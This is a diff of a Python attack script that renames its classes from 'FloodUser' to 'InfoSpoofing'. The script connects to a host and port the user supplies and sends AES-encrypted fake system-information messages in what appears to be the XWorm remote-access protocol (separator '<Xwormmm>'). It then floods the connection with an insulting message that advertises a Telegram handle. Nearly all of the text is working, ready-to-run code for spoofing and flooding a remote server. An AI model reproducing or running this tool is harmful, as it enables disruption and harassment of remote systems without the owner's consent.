@@ -6,7 +6,7 @@ import socket
 import time
 import os
 
-class FloodUserUtils:
+class InfoSpoofingUtils:
     def aes_encryptor(input_bytes, key):
         key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
         cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
@@ -14,11 +14,11 @@ class FloodUserUtils:
         return cipher.encrypt(padded) # Return encrypted bytes
 
     def send_encrypted(sock, text: str, key: str): 
-        encrypted = FloodUserUtils.aes_encryptor(text.encode(), key) # Encrypt the text
+        encrypted = InfoSpoofingUtils.aes_encryptor(text.encode(), key) # Encrypt the text
         header = (str(len(encrypted)) + "\0").encode() # Create header with length
         sock.sendall(header + encrypted) # Send header and encrypted data
 
-class FloodUser:
+class InfoSpoofing:
     SPL_XCLIENT = "<Xwormmm>"
 
     @staticmethod
@@ -26,8 +26,8 @@ class FloodUser:
         host = input("Host > ") # Get target host
         port = input("Port > ") # Get target port
         key = input("Key > ") # Get encryption key
-        sock = FloodUser.connection(host, port) # Connect to target
-        FloodUser.trigger(sock, key) # Trigger the Informations
+        sock = InfoSpoofing.connection(host, port) # Connect to target
+        InfoSpoofing.trigger(sock, key) # Trigger the Informations
 
 
     def connection(host, port):
@@ -71,15 +71,15 @@ class FloodUser:
             strings_info.append(".Net : " + ".Net Version" + "-=>")  
             strings_info.append("Battery : " + "Battery Status" + " | t.me/swezy") 
 
-            payload =  f"Informations{FloodUser.SPL_XCLIENT}ClientID" 
-            FloodUserUtils.send_encrypted(sock, payload, key) # Send encrypted message
+            payload =  f"Informations{InfoSpoofing.SPL_XCLIENT}ClientID" 
+            InfoSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted message
 
             if isinstance(strings_info, list): # Check if strings_info is a list
                 for item in strings_info: # Iterate through each item
                     if item.lower().startswith("username : "): # Check for username
                         system_info_string = ''.join(strings_info) # Join list into a single string
-                        payload = f"GetInformations{FloodUser.SPL_XCLIENT}ClientID{FloodUser.SPL_XCLIENT}{system_info_string}" # Create payload
-                        FloodUserUtils.send_encrypted(sock, payload, key) # Send encrypted message
+                        payload = f"GetInformations{InfoSpoofing.SPL_XCLIENT}ClientID{InfoSpoofing.SPL_XCLIENT}{system_info_string}" # Create payload
+                        InfoSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted message
                         print("Info sent.")
                         while True:
                             sock.sendall(b'Get fucked by t.me/swezy') # Keep the connection alive
@@ -89,4 +89,4 @@ class FloodUser:
             print(f"Failed to send message: {e}")
 
 if __name__ == "__main__":
-    FloodUser.main()
+    InfoSpoofing.main()
